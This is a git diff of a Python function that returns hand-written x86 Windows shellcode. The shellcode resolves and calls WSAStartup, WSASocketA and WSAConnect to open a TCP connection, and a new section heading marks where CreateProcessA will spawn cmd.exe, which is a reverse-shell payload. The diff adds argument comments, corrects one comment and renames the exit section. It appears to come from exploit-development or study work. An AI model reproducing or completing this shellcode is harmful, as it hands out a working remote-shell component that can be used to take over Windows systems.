@@ -363,6 +363,15 @@ def ret_asm() -> str:
         call [ebp + 0x1C]                           ; Call WSAStartup(MAKEWORD(2,2), &WSADATA)
 
     ; ===== CALL_WSASOCKETA: Setup args and call WSASocketA =====
+    ; WSASocketA(AF, Type, Protocol, lpProtocolInfo, g, dwFlags)
+    ; AF = 2 (AF_INET)
+    ; Type = 1 (SOCK_STREAM)
+    ; Protocol = 6 (IPPROTO_TCP)
+    ; lpProtocolInfo = NULL <- Requires a pointer to WSAPROTOCOL_INFO struct, not needed here
+    ; g = NULL <- Pointer to group id, not needed here
+    ; dwFlags = 0 <- No special flags, can be [e.g., WSA_FLAG_OVERLAPPED]
+
+
     CALL_WSASOCKETA:
         xor eax, eax                                ; EAX = 0
         push eax                                    ; Push dwFlags = 0
@@ -379,6 +388,17 @@ def ret_asm() -> str:
         int3
 
     ; ===== CALL_WSACONNECT: Setup args and call WSAConnect =====
+    ; WSAConnect(s, *name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS)
+    ; lpCallerData, lpCalleeData, lpSQOS, lpGQOS = NULL <- REASON:: Legacy|NotUsed
+    ; *name = pointer to sockaddr structure
+    ; UCHAR s_b1;
+    ; UCHAR s_b2;
+    ; UCHAR s_b3;
+    ; UCHAR s_b4;
+    ; USHORT s_w1;
+    ; USHORT s_w2;
+    ; ULONG S_addr;
+
     CALL_WSACONNECT:
         mov esi, eax                                ; ESI SOCKET DESCRIPTOR
         xor eax, eax                                ; EAX = 0
@@ -397,7 +417,7 @@ def ret_asm() -> str:
         xor eax, eax                                ; EAX = 0
         push eax                                    ; Push lpGQOS
         push eax                                    ; Push lpSQOS
-        push eax                                    ; Push lpCalleeData
+        push eax                                    ; Push lpCallerData
         push eax                                    ; Push lpCalleeData
         add al, 0x10                                ; EAX = 16 (size of sockaddr_in)
         push eax                                    ; Push iSockaddrLength
@@ -405,10 +425,11 @@ def ret_asm() -> str:
         push esi                                    ; Push s (socket descriptor)
         call [ebp + 0x24]                           ; Call WSAConnect
 
+    ; ===== CREATE_PROCESS: Setup args and call CreateProcessA to spawn cmd.exe =====
+
         
-        
-    ; ===== EXEC_SHELLCODE: With everything ready in the stack we can proceed w our func calls here =====
-    EXEC_SHELLCODE:
+    ; ===== EXIT_PROCESS: With everything ready in the stack we can proceed w our func calls here =====
+    EXIT_PROCESS:
         xor ecx, ecx                                ; ECX = 0
         push ecx                                    ; Push 0 as exit code parameter
         push 0xFFFFFFFF                             ; Push -1 (current process handle constant)
